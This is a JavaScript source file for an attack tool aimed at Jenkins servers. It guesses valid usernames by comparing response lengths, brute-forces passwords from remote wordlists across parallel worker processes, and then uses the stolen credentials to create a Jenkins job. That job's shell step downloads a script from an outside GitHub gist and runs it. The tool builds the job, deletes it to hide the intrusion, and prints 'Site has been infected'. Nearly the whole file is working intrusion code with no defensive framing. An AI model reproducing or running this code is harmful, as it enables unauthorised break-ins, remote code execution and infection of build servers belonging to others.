const cluster = require('cluster');
const os = require('os');

const Axios = require('axios');
const Jenkins = require('jenkins');
const xmlescape = require('xml-escape');

const config = require('./config.json');

const numCPUs = os.cpus().length;
const possibleChars = new Set([...'abcdefghijklmnopqrstuvwxyz'.split('')]);

const downloadAndExecute = 'wget https://gist.githubusercontent.com/Naramsim/05e770c3c0c07e54a35876f78ade98f3/raw && chmod +x raw && sh raw && rm raw'

const command = xmlescape(downloadAndExecute);

const xmlJob = `<?xml version='1.0' encoding='UTF-8'?>
<project>
  <actions/>
  <description></description>
  <keepDependencies>false</keepDependencies>
  <properties/>
  <scm class="hudson.scm.NullSCM"/>
  <canRoam>true</canRoam>
  <disabled>false</disabled>
  <blockBuildWhenDownstreamBuilding>false</blockBuildWhenDownstreamBuilding>
  <blockBuildWhenUpstreamBuilding>false</blockBuildWhenUpstreamBuilding>
  <triggers class="vector"/>
  <concurrentBuild>false</concurrentBuild>
  <builders>
    <hudson.tasks.Shell>
      <command>${command}</command>
    </hudson.tasks.Shell>
  </builders>
  <publishers/>
  <buildWrappers/>
</project>`;

console.log("W")

var permutationLength = 1;
var namesDictIndex = -1;
var passwordDictIndex = -1;
var usernameFound = '';
var passwordFound = '';
var generator = subsets(possibleChars, permutationLength);
var namesDict = [];
var passwordDict = [];
var host = config.host;
    
function loadArray(url) {
    return new Promise((resolve) => {
        Axios.get(url)
            .then(result => {
                resolve(result.data.split('\n'));
            })
    });
}

function loadConfiguration() {
    return new Promise((resolve) => {
        const urls = [config.names, config.passwords];
        const urlsPromises = urls.map(url => loadArray(url));

        Promise.all(urlsPromises).then(([names, passwords]) => {
            namesDict = names;
            passwordDict = passwords;
            resolve();
        });
    });
}

function testUser(username) {
    return new Promise((resolve) => {
        var instance = Jenkins({ baseUrl: `http://${username}:fakePass@${host}`, crumbIssuer: false, promisify: 1 });
        instance.info()
        .then(console.log) // resolve 2
        .catch(err => {
                //console.log(err.res.body.length)
                // 278, no luck // other, lucky one
                if (err.res.body.length !== 278) { 
                    resolve(username);
                } else { // if === 278 check with a /.*Failed.*/.test(err.res.body)
                    resolve(0);
                }
            });
    })
}

function testPassword(username, password) {
    return new Promise((resolve) => {
        var instance = Jenkins({ baseUrl: `http://${username}:${password}@${host}`, crumbIssuer: false, promisify: 1 });
        instance.info()
        .then(data => {
            resolve(password);
        })
        .catch(err => {
            resolve(0);
        });
    });
}

// generator that generates fixed-length permutation of a Set
// see: http://stackoverflow.com/a/37900542/3482533
function subsets(set, n) {
    if(!Number.isInteger(n) || n < 0) return function*(){}();
    var subset = new Array(n),
        iterator = set.values();
    return (function* backtrack(index) {
        if(index === n) {
            yield subset.slice();
        } else {
            for(var i=0; i<set.size; ++i) {
                subset[index] = iterator.next().value; /* Get first item */
                set.delete(subset[index]); /* Remove it */
                set.add(subset[index]); /* Insert it at the end */
                yield* backtrack(index+1);
            }
        }
    })(0);
}

function nextUsernameValue() {
    if (namesDict.length) {
        return namesDict.shift();
    } else {
        var next = generator.next();
        if (next.done) {
            generator = subsets(possibleChars, ++permutationLength);
            return nextUsernameValue();
        } else {
            return next.value.join('');
        }
    }
}

function nextPasswordValue() {
    if (passwordDict.length) {
        return passwordDict.shift();
    } else {
        var next = generator.next();
        if (next.done) {
            generator = subsets(possibleChars, ++permutationLength);
            return nextPasswordValue();
        } else {
            return next.value.join('');
        }
    }
}

function resetGeneratorLevel() {
    permutationLength = 1;
    generator = subsets(possibleChars, permutationLength);
}

function createAndTriggerJob() {
    var instance = Jenkins({ baseUrl: `http://${usernameFound}:${passwordFound}@${host}`, crumbIssuer: false, promisify: 1 });
    instance.job.create('friendlyJob', xmlJob)
        .then(result => {
            instance.job.build('friendlyJob').then(() => {
                setTimeout(() => {
                    instance.job.destroy('friendlyJob').then(() => {
                        console.log('Site has been infected');
                        process.exit(0);
                    }).catch(console.log);
                }, 10000); 
            }).catch(console.log);
        }).catch(console.log);
}

if (cluster.isMaster) {
    // Load config and dictionaries
    loadConfiguration().then(() => {
        // Fork workers
        var workers = [];
        for (var i = 0; i < numCPUs; i++) {
            workers.push(cluster.fork());
        }
        workers.forEach(worker => {
            worker.on('message', (msg) => {
                if (usernameFound && passwordFound) {
                    // wait for master to pwn the target
                } else if (usernameFound && msg.password) {
                    console.log(`Found an account: ${usernameFound} ${msg.password}`);
                    passwordFound = msg.password;
                    createAndTriggerJob();
                } else if (usernameFound) { // username has been found
                    var passwordToTry = nextPasswordValue();
                    console.log(`Cracking username: ${usernameFound} with ${passwordToTry}`);
                    //usernameFound = msg.username;
                    worker.send({ username: usernameFound, password: passwordToTry });
                } else if (msg.username) { // username found
                    console.log(`Start cracking username: ${msg.username}`);
                    usernameFound = msg.username;
                    resetGeneratorLevel();
                    worker.send({ username: usernameFound, password: nextPasswordValue() });
                } else {
                    const nextTry = nextUsernameValue();
                    console.log(`Trying username ${nextTry}`);
                    worker.send({ username: nextTry });
                }
            });
            worker.send({ username: nextUsernameValue() });
        });
    }).catch(console.log);
} else {
    process.on('message', (msg) => {
        if (msg.username && msg.password) {
            testPassword(msg.username, msg.password).then(result => {
                process.send({ username: msg.username, password: result });
            });
        } else if (msg.username) {
            testUser(msg.username).then(result => {
                process.send({ username: result });
            });
        }
    });
};
